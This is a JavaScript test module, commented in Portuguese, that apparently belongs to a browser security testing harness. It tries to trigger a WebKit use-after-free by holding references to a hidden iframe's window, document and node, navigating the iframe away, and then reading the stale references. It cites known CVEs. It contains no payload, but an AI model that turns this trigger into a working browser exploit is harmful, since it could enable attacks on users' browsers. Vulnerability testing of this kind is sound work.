/**
 * SC_IFRAME_FRAME_UAF.JS
 * Categoria : DOM — Use-After-Free (WindowProxy)
 * Alvo      : WebCore::LocalFrame / WindowProxy C++ lifecycle
 * Técnica   : Obtém referência ao contentWindow de um iframe,
 *             navega o iframe para about:blank (libera o Frame C++),
 *             e então tenta acessar o WindowProxy stale.
 *             O WindowProxy JS deve redirecionar, mas o Frame C++
 *             subjacente pode já ter sido coletado.
 * Referência: CVE-2021-30661, CVE-2022-32893 (WebKit frame UAF)
 */

export default {
    id:          'IFRAME_DOCWRITE_FRAME_UAF',
    category:    'DOM',
    risk:        'HIGH',
    description: 'WindowProxy stale após navegação do iframe. '
                + 'Testa acesso ao Frame C++ liberado via referência JS retida.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _iframe:      null,
    _win:         null,
    _doc:         null,
    _divRef:      null,
    _container:   null,

    supported: function() {
        return typeof document !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        this._iframe = document.createElement('iframe');
        this._iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
        this._container.appendChild(this._iframe);

        // Aguarda load do iframe
        await new Promise(r => {
            this._iframe.onload = r;
            this._iframe.src = 'about:blank';
        });

        // Guarda referências ao frame original
        this._win = this._iframe.contentWindow;
        this._doc = this._iframe.contentDocument;

        // Escreve conteúdo e obtém referência a um nó interno
        try {
            this._doc.open();
            this._doc.write('<div id="canary">original test</div>');
            this._doc.close();
            this._divRef = this._doc.getElementById('canary');
        } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Navega o iframe — libera o Frame/Document C++ originais
        await new Promise(r => {
            this._iframe.onload = r;
            this._iframe.src = 'about:blank';
        });

        // Re-escreve conteúdo diferente (novo frame, novo Document)
        try {
            this._iframe.contentDocument.open();
            this._iframe.contentDocument.write('<div id="canary">REWRITTEN</div>');
            this._iframe.contentDocument.close();
        } catch(_) {}

        await new Promise(r => setTimeout(r, 20));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] WindowProxy stale — deve redirecionar para novo frame
        s => s._win?.location?.href  ?? 'null',
        s => s._win?.document?.readyState ?? 'null',
        s => typeof s._win,
        s => s._win === s._iframe.contentWindow,

        // [4-5] Document stale
        s => s._doc?.readyState ?? 'null',
        s => s._doc?.URL ?? 'null',

        // [6-8] nó do documento original — após remoção pode ser UAF
        s => s._divRef?.textContent ?? 'null',
        s => s._divRef?.isConnected ?? false,
        s => s._divRef?.ownerDocument === s._doc,

        // [9] novo frame tem o conteúdo certo?
        s => s._iframe.contentDocument?.getElementById('canary')?.textContent ?? 'null',

        // [10] iframe ainda conectado
        s => s._iframe.isConnected,
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._container?.remove();
        this._container = null;
        this._iframe    = null;
        this._win       = null;
        this._doc       = null;
        this._divRef    = null;
    }
};
